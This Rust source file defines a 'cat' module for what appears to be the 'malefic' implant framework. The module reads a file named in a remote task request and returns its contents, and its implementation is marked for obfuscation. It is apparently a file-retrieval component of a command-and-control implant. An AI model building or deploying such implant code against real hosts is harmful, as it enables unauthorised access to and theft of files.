use crate::prelude::*;
use malefic_proto::proto::modulepb::BinaryResponse;

pub struct Cat {}

#[async_trait]
#[module_impl("cat")]
impl Module for Cat {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for Cat {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;

        let filename = check_field!(request.input)?;
        let data = std::fs::read(filename)?;

        let mut response = BinaryResponse::default();
        response.data = data;
        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(response),
        ))
    }
}
